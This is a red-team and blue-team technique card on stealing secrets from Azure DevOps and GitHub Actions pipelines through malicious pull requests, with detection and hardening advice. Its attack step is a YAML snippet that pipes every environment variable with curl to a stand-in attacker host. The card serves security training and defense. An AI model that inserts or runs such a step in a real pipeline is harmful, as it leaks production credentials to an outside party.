# [CA-UNSC-015]: Pipeline Environment Variables Theft

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-UNSC-015 |
| **MITRE ATT&CK v18.1** | [Unsecured Credentials: Credentials In Files (T1552.001)](https://attack.mitre.org/techniques/T1552/001/) |
| **Tactic** | Credential Access |
| **Platforms** | Azure DevOps / GitHub Actions |
| **Severity** | **Critical** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** CI/CD pipelines often use Environment Variables to store secrets (e.g., `AZURE_CREDENTIALS`). If an attacker can modify the pipeline definition (`azure-pipelines.yml`) or inject code via a Pull Request (PR), they can print these variables to the build logs or exfiltrate them via curl.
- **Attack Surface:** Pull Requests and Pipeline Definitions.
- **Business Impact:** **Production Access**. Pipelines usually deploy to Prod, so they hold Prod secrets.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Contributor to the Repo (or Fork PR if workflows trigger on PRs).
- **Tools:**
    - Custom YAML / Bash

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Malicious Commit**
Create a PR that adds a step to print environment variables.
```yaml
# azure-pipelines.yml
- script: |
    env
    curl -d @- http://attacker.com/ < <(env)
  displayName: 'Exfiltrate Env Vars'
```

**Step 2: Trigger Build**
Push the commit. The build agent runs the script and sends secrets to your listener.

## 5. DETECTION (Blue Team Operations)

#### 5.1 Pipeline Logs
| Source | Event | Filter Logic |
|---|---|---|
| **ADO Auditing** | `Update Definition` | Modification of pipeline YAML by unexpected users. |
| **GitHub** | `workflow_run` | Runs triggered by PRs from forks. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Branch Protection:** Require approval for all PRs.
*   **Secrets Management:** Use Key Vault integration (`AzureKeyVault@2` task) instead of pipeline variables, and ensure secrets are not echoed.
*   **Fork Protection:** Do not expose secrets to builds triggered from forks.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-CLOUD-002]
> **Next Logical Step:** [LAT-CLOUD-001]
